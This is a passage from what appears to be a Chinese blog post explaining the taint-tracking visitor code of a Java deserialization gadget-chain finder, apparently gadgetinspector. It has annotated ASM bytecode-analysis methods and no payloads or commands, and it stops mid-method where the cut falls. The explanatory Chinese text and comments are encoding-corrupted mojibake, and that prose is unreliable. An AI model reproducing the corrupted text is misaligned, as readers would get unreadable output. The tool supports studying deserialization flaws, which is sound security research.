passthroughDataflowMethodVisitor = <span class="keyword">new</span> PassthroughDataflowMethodVisitor(</span><br><span class="line">                classMap, inheritanceMap, <span class="keyword">this</span>.passthroughDataflow, serializableDecider,</span><br><span class="line">                api, mv, <span class="keyword">this</span>.name, access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç®€åŒ–ä»£ç åˆ†æï¼Œåˆ é™¤ JSR æŒ‡ä»¤å¹¶å†…è”å¼•ç”¨çš„å­ä¾‹ç¨‹</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JSRInlinerAdapter(passthroughDataflowMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è¿”å›èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Set&lt;Integer&gt; <span class="title">getReturnTaint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (passthroughDataflowMethodVisitor == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Never constructed the passthroughDataflowmethodVisitor!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> passthroughDataflowMethodVisitor.returnTaint;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PassthroughDataflowMethodVisitor</code> ç»§æ‰¿ <code>TaintTrackingMethodVisitor</code> å®ç°ï¼Œé‡å†™äº†å…¶ä¸­çš„ 4 ä¸ªè®¿é—®è€…æ–¹æ³•ï¼š</p><ul><li>visitCodeï¼šå¯åŠ¨å¯¹æ–¹æ³•ä»£ç çš„è®¿é—®ï¼ŒæŠŠå‚æ•°å…¨éƒ¨å­˜åˆ°æœ¬åœ°å˜é‡è¡¨</li><li>visitInsnï¼šè®¿é—®é›¶æ“ä½œæ•°çš„æŒ‡ä»¤ï¼Œè¿™é‡Œåªåˆ†æè¿”å›æŒ‡ä»¤</li><li>visitFieldInsnï¼šè®¿é—®å­—æ®µæŒ‡ä»¤ï¼Œå­—æ®µæŒ‡ä»¤æ˜¯åŠ è½½æˆ–å­˜å‚¨å¯¹è±¡å­—æ®µå€¼çš„æŒ‡ä»¤</li><li>visitMethodInsnï¼šè®¿é—®æ–¹æ³•æŒ‡ä»¤ï¼Œæ–¹æ³•æŒ‡ä»¤æ˜¯è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤</li></ul><p>ä½†æ˜¯ TaintTrackingMethodVisitor ç»§æ‰¿ asm çš„ MethodVisitor å¹¶é‡å†™äº†å¤§é‡çš„æ–¹æ³•ï¼Œæ¨¡æ‹Ÿ JVM åœ¨å¤„ç†æ–¹æ³•è°ƒç”¨ä¸­çš„æœ¬åœ°å˜é‡è¡¨å’Œæ“ä½œæ•°æ ˆï¼Œå› æ­¤å®é™…è°ƒç”¨çš„è®¿é—®è€…æ–¹æ³•æ¥è‡ª PassthroughDataflowMethodVisitorã€TaintTrackingMethodVisitorã€MethodVisitor ä¸‰ä¸ªç±»ã€‚æ¨¡æ‹Ÿæ˜¯æ ¹æ®å¯¹å­—èŠ‚ç æŒ‡ä»¤å’Œ JVM çš„äº†è§£æ‰‹åŠ¨è¿›è¡Œå®ç°ï¼ˆæ•‘å‘½ï¼‰ï¼Œå…ˆè§£æè¿™é‡Œçš„ 4 ä¸ªé‡å†™æ–¹æ³•ã€‚</p><p>æ•°æ®æµä¿¡æ¯ <code>passthroughDataflow</code> åˆå§‹ä¸ºç©ºï¼Œé›†åˆå˜é‡ <code>returnTaint</code> ç”¨äºè®°å½•ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PassthroughDataflowMethodVisitor</span> <span class="keyword">extends</span> <span class="title">TaintTrackingMethodVisitor</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, ClassReference&gt; classMap;              <span class="comment">// ç±»ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;                                    <span class="comment">// ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;    <span class="comment">// æ•°æ®æµä¿¡æ¯ï¼šæ–¹æ³•-&gt;ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;                          <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> access;               <span class="comment">// è®¿é—®æ ‡å¿—</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String desc;              <span class="comment">// æè¿°ç¬¦</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Integer&gt; returnTaint; <span class="comment">// èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PassthroughDataflowMethodVisitor</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                            InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle,</span></span></span><br><span class="line"><span class="function"><span class="params">            Set&lt;Integer&gt;&gt; passthroughDataflow, SerializableDecider serializableDeciderMap, <span class="keyword">int</span> api, MethodVisitor mv,</span></span></span><br><span class="line"><span class="function"><span class="params">                                            String owner, <span class="keyword">int</span> access, String name, String desc, String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inheritanceMap, passthroughDataflow, api, mv, owner, access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="keyword">this</span>.classMap = classMap;</span><br><span class="line">        <span class="keyword">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        <span class="keyword">this</span>.passthroughDataflow = passthroughDataflow;</span><br><span class="line">        <span class="keyword">this</span>.serializableDecider = serializableDeciderMap;</span><br><span class="line">        <span class="keyword">this</span>.access = access;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">        returnTaint = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitCode</code> æ–¹æ³•å°†è¢«è®¿é—®çš„æ–¹æ³•å‚æ•°è®°å½•åˆ°æœ¬åœ°å˜é‡è¡¨ä¸­ï¼Œå¦‚æœæ˜¯éé™æ€æ–¹æ³•ï¼Œåˆ™æ·»åŠ éšå¼å‚æ•° thisã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;   <span class="comment">// å¯åŠ¨å¯¹æ–¹æ³•ä»£ç çš„è®¿é—®</span></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitCode åˆå§‹åŒ–æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">    <span class="keyword">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®°å½•å‚æ•°åˆ°æœ¬åœ°å˜é‡è¡¨ savedVariableState.localVars</span></span><br><span class="line">    <span class="keyword">int</span> localIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> argIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// éé™æ€æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆéšå¼ï¼‰ä¸ºå¯¹è±¡å®ä¾‹ this</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.setLocalTaint æ·»åŠ åˆ°æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">        setLocalTaint(localIndex, argIndex);</span><br><span class="line">        localIndex += <span class="number">1</span>;</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†å‚æ•°ï¼Œæ ¹æ®æè¿°ç¬¦å¾—å‡ºå‚æ•°ç±»å‹ï¼ˆå ç”¨ç©ºé—´å¤§å°ï¼‰</span></span><br><span class="line">    <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.setLocalTaint æ·»åŠ åˆ°æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">        setLocalTaint(localIndex, argIndex);</span><br><span class="line">        localIndex += argType.getSize();</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitInsn</code> æ–¹æ³•å°†å­˜å‚¨åœ¨æ ˆé¡¶çš„è¿”å›å€¼ï¼ˆä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆï¼Œå¯èƒ½ä¸ºç©ºï¼‰ä¸­çš„å…ƒç´ æ·»åŠ åˆ° <code>returnTaint</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInsn</span><span class="params">(<span class="keyword">int</span> opcode)</span> </span>&#123; <span class="comment">// è®¿é—®é›¶æ“ä½œæ•°æŒ‡ä»¤</span></span><br><span class="line">    <span class="comment">// æ–¹æ³•æ‰§è¡Œå®Œæ¯•åå°†ä»æ ˆè¿”å›ç»“æœç»™è°ƒç”¨è€…ï¼Œå› æ­¤æ ˆé¡¶å³è¿”å›å€¼</span></span><br><span class="line">    <span class="comment">// å­˜å‚¨å¯èƒ½è¢«æ±¡æŸ“çš„è¿”å›å€¼åˆ° returnTaint</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.IRETURN:   <span class="comment">// ä»å½“å‰æ–¹æ³•è¿”å› int</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.FRETURN:   <span class="comment">// ä»å½“å‰æ–¹æ³•è¿”å› float</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.ARETURN:   <span class="comment">// ä»å½“å‰æ–¹æ³•è¿”å›å¯¹è±¡å¼•ç”¨</span></span><br><span class="line">            <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.getStackTaint è¯»å–æ ˆé¡¶ï¼Œå¤§å°ä¸º 1ï¼ˆ32ä½ï¼‰</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">0</span>));   <span class="comment">// æ ˆç©ºé—´ä»å†…å­˜é«˜ä½åˆ°ä½ä½åˆ†é…ç©ºé—´</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.LRETURN:   <span class="comment">// ä»å½“å‰æ–¹æ³•è¿”å› long</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.DRETURN:   <span class="comment">// ä»å½“å‰æ–¹æ³•è¿”å› double</span></span><br><span class="line">            <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.getStackTaint è¯»å–æ ˆé¡¶ï¼Œå¤§å°ä¸º 2ï¼ˆ64ä½ï¼‰</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">1</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.RETURN:    <span class="comment">// ä»å½“å‰æ–¹æ³•è¿”å› void</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitInsn è¿›è¡Œå‡º/å…¥æ ˆæ“ä½œ</span></span><br><span class="line">    <span class="keyword">super</span>.visitInsn(opcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitFieldInsn</code> æ–¹æ³•åœ¨è¯»å–æˆ–å­˜å‚¨å¯¹è±¡å­—æ®µçš„å€¼æ—¶è°ƒç”¨ï¼Œè¿™é‡Œåˆ¤æ–­å­—æ®µæ˜¯å¦å¯åºåˆ—åŒ–ï¼Œå¦‚æœå¯åºåˆ—åŒ–åˆ™è®¤ä¸ºæ–¹æ³•æ‰€å±ç±»çš„å®ä¾‹å¯¹è±¡æœ¬èº«æˆ–è¢«è°ƒç”¨æ–¹æ³•æ‰€å±ç±»çš„å®ä¾‹å¯¹è±¡æ˜¯å—æ±¡æŸ“çš„ï¼Œå°†å…¶ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆå­˜å‚¨åˆ° <code>taint</code> å˜é‡ä¸­ã€‚<br>å› ä¸ºå¯èƒ½è¯»å–çš„æ˜¯æ–¹æ³•æ‰€å±ç±»çš„å®ä¾‹å¯¹è±¡å­—æ®µï¼Œä¹Ÿå¯èƒ½æ˜¯å…¶ä»–å¯¹è±¡ï¼Œå…¶ä»–å¯¹è±¡å¾—é€šè¿‡æ–¹æ³•è°ƒç”¨è¯»å–å­—æ®µï¼Œæ¶‰åŠåˆ°æ–¹æ³•è°ƒç”¨æ–¹æ³•ï¼Œå…·ä½“è§ <code>visitMethodInsn</code> æ–¹æ³•ä¸­çš„åˆ†æã€‚æœ€åå°†æ ˆé¡¶ï¼ˆè¯»å–å­—æ®µçš„è¿”å›å€¼ï¼‰è®¾ç½®ä¸º <code>taint</code>ï¼Œè¿™é‡Œå¯èƒ½æ˜¯ç©ºçš„ HashSetã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitFieldInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc)</span> </span>&#123;    <span class="comment">// è®¿é—®å­—æ®µæŒ‡ä»¤ï¼Œå­—æ®µæŒ‡ä»¤æ˜¯åŠ è½½æˆ–å­˜å‚¨å¯¹è±¡å­—æ®µå€¼çš„æŒ‡ä»¤ã€‚</span></span><br><span class="line">    <span class="comment">// æ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­å¯èƒ½è®¿é—®å¯¹è±¡å­—æ®µï¼Œè®¿é—®å‰ä¼šè¿›è¡Œå…¥æ ˆæ“ä½œ</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETSTATIC: <span class="comment">// è·å–ç±»çš„é™æ€å­—æ®µ</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTSTATIC: <span class="comment">// è®¾ç½®ç±»çš„é™æ€å­—æ®µ</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETFIELD:  <span class="comment">// è·å–å¯¹è±¡å­—æ®µ</span></span><br><span class="line">            Type type = Type.getType(desc); <span class="comment">// å­—æ®µç±»å‹</span></span><br><span class="line">            <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                Boolean isTransient = <span class="keyword">null</span>; <span class="comment">// å¦‚æœå­—æ®µè¢« transient å…³é”®å­—ä¿®é¥°ï¼Œåˆ™ä¸å¯åºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// åˆ¤æ–­è¯»å–çš„å­—æ®µæ‰€å±ç±»æ˜¯å¦å¯åºåˆ—åŒ–ï¼Œå³å­—æ®µæ˜¯å¦å¯ä»¥åºåˆ—åŒ–</span></span><br><span class="line">                <span class="comment">// If a field type could not possibly be serialized, it&#x27;s effectively transient</span></span><br><span class="line">                <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> ClassReference.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                    isTransient = Boolean.TRUE;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// è‹¥è¯»å–çš„å­—æ®µæ‰€å±ç±»å¯åºåˆ—åŒ–</span></span><br><span class="line">                    ClassReference clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(owner));</span><br><span class="line">                    <span class="keyword">while</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// éå†ç±»çš„æ‰€æœ‰å­—æ®µ</span></span><br><span class="line">                        <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                            <span class="comment">// æ˜¯å¦ä¸ºç›®æ ‡å­—æ®µ</span></span><br><span class="line">                            <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                <span class="comment">// æ˜¯å¦è¢« transient å…³é”®å­—ä¿®é¥°</span></span><br><span class="line">                                isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (isTransient != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// è‹¥æ‰¾ä¸åˆ°ç›®æ ‡å­—æ®µï¼Œåˆ™å‘ä¸ŠæŸ¥æ‰¾ï¼ˆè¶…ç±»ï¼‰</span></span><br><span class="line">                        clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(clazz.getSuperClass()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">// èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">                Set&lt;Integer&gt; taint;</span><br><span class="line">                <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                    <span class="comment">// è‹¥å­—æ®µæ²¡æœ‰è¢« transient ä¿®é¥°ï¼Œåˆ™è°ƒç”¨ TaintTrackingMethodVisitor.getStackTaint è¯»å–æ ˆé¡¶</span></span><br><span class="line">                    <span class="comment">// å–å‡ºçš„æ˜¯ this æˆ–æŸå®ä¾‹å¯¹è±¡ï¼Œå³å­—æ®µæ‰€å±å®ä¾‹</span></span><br><span class="line">                    taint = getStackTaint(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// å¦åˆ™ä¸ºç©º</span></span><br><span class="line">                    taint = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitFieldInsn è¿›è¡Œå‡º/å…¥æ ˆæ“ä½œ</span></span><br><span class="line">                <span class="keyword">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.setStackTaint å°†æ ˆé¡¶è®¾ç½®ä¸º taint</span></span><br><span class="line">                setStackTaint(<span class="number">0</span>, taint);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTFIELD:  <span class="comment">// è®¾ç½®å¯¹è±¡å­—æ®µ</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitFieldInsn è¿›è¡Œå‡º/å…¥æ ˆæ“ä½œ</span></span><br><span class="line">    <span class="keyword">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br></pre></td></tr></table></figure><p><code>visitMethodInsn</code> æ–¹æ³•åœ¨æ–¹æ³•è°ƒç”¨æ–¹æ³•æ—¶è°ƒç”¨ï¼ˆç»•å£ä»¤å‘¢ğŸ˜…ï¼‰</p><ul><li>é¦–å…ˆè®°å½•è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼ˆåˆ—è¡¨ï¼‰ï¼Œæ ¹æ®æ˜¯å¦ä¸ºé™æ€æ–¹æ³•æ·»åŠ ç¬¬ä¸€ä¸ªéšå¼å‚æ•°ï¼ˆè¢«è°ƒç”¨æ–¹æ³•æ‰€å±ç±»çš„å®ä¾‹å¯¹è±¡ï¼‰</li><li>ç„¶åè®°å½•è¢«è°ƒç”¨æ–¹æ³•çš„è¿”å›å€¼ç±»å‹é•¿åº¦ï¼ˆ0~2ï¼‰ï¼Œç”¨äºæœ€åå­˜å‚¨ç´¢å¼•é›†åˆ</li><li>æ¨¡æ‹Ÿè¢«è°ƒç”¨æ–¹æ³•çš„æ“ä½œæ•°æ ˆï¼Œå¦‚æœæ˜¯æ„é€ æ–¹æ³•åˆ™è®¤ä¸ºéšå¼å‚æ•°èƒ½å¤Ÿä¼ é€’æ±¡æŸ“ï¼Œå¦‚æœè¢«è°ƒç”¨æ–¹æ³•åœ¨å·²ç»åˆ†æçš„æ•°æ®æµä¿¡æ¯ä¸­åˆ™ç›´æ¥å–å‡ºç›¸åº”çš„å‚æ•°ç´¢å¼•é›†åˆï¼Œä¿å­˜åˆ° <code>resultTaint</code> å˜é‡ä¸­</li><li>è°ƒç”¨çˆ¶ç±»æ–¹æ³• <code>TaintTrackingMethodVisitor.visitMethodInsn</code> æ‰§è¡ŒçœŸæ­£çš„å‡º/å…¥æ ˆæ¨¡æ‹Ÿï¼Œç„¶åå°†å‚æ•°ç´¢å¼•é›†åˆå­˜å‚¨åˆ°æ ˆé¡¶</li><li>æœ€åæ ¹æ®è¢«è°ƒç”¨æ–¹æ³•çš„è¿”å›å€¼ç±»å‹é•¿åº¦å°† <code>resultTaint</code> ä¹Ÿåˆå¹¶åˆ°æ ˆé¡¶</li></ul><p>è°ƒç”¨æ–¹æ³•æ—¶ä¼šåˆ›å»ºæ–°çš„æ ˆå¸§å­˜å‚¨ç”¨åˆ°çš„ç›¸å…³æ•°æ®ï¼Œå› æ­¤å½“è°ƒç”¨åˆ° <code>visitMethodInsn</code> æ—¶ä¼šåˆ›å»ºæ–°çš„æ ˆå¸§ï¼Œå…¶æ“ä½œæ•°æ ˆä¸­æ˜¯è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°ï¼ˆè€Œä¸æ˜¯å½“å‰æ–¹æ³•ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMethodInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc, <span class="keyword">boolean</span> itf)</span> </span>&#123;  <span class="comment">// è®¿é—®æ–¹æ³•æŒ‡ä»¤ï¼Œæ–¹æ³•æŒ‡ä»¤æ˜¯è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤ã€‚</span></span><br><span class="line">    <span class="comment">// æ ¹æ®æè¿°ç¬¦å¾—å‡ºè¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼ˆå ç”¨ç©ºé—´å¤§å°ï¼‰</span></span><br><span class="line">    Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éé™æ€æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯¹è±¡æœ¬èº«ï¼Œå³ this</span></span><br><span class="line">    <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) 